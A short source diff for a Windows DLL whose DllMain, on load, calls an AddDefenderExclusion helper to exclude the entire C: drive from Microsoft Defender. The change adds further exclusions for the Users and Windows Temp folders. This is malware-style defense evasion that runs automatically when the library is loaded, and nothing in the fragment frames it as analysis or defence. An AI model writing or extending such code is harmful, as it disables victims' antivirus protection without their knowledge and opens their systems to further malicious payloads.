@@ -34,6 +34,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
         AddDefenderExclusion(L"C:\\");
+        AddDefenderExclusion(L"C:\\Users");
+        AddDefenderExclusion(L"C:\\Windows\\Temp");
     }
     return TRUE;
 }
